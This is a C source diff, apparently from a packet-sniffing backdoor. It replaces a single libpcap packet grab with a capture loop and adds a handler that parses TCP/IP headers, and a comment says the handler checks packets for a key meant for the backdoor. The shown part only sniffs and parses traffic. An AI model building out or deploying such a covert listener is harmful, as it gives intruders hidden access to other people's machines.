@@ -170,7 +170,6 @@ void server(){
     }
     
     // Open sniffing session
-    
     handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if(handle == NULL) {
         fprintf(stderr, "Couldn't open device: %s\n", errbuf);
@@ -190,17 +189,18 @@ void server(){
         fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
         system_fatal("pcap_setfilter");
     }
+    printf("Filter: %s\n", filter_exp);
     
     /* Packet capture loop */
     
     // Grab a packet
-	packet = pcap_next(handle, &header);
+	//packet = pcap_next(handle, &header);
 	
-	// Print its length
-	printf("Jacked a packet with length of [%d]\n", header.len);
+	// Close the session
+	//pcap_close(handle);
 	
-	// And close the session
-	pcap_close(handle);
+	// Packet capture loop
+	pcap_loop(handle, -1, packet_handler, NULL);
 }
 
 /*
@@ -298,7 +298,21 @@ int send_datagram(struct addr_info *user_addr){
 | ------------------------------------------------------------------------------
 */
 
-void packet_handler(){
+void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
+    
+    /* Parse packet */
+    
+    // Print its length
+	printf("Jacked a packet with length of [%d]\n", header->len);
+    
+    // Get packet info
+    struct tcp_ip_packet packet_info;
+    if(tcp_ip_typecast(packet, &packet_info) == 0){
+        perror("tcp_ip_typecast");
+        return;
+    }
+    
+    printf("IP Protocol: %c\n", packet_info.ip->ip_p);
     
     /* Check the packet for the header key meant for the backdoor */
     
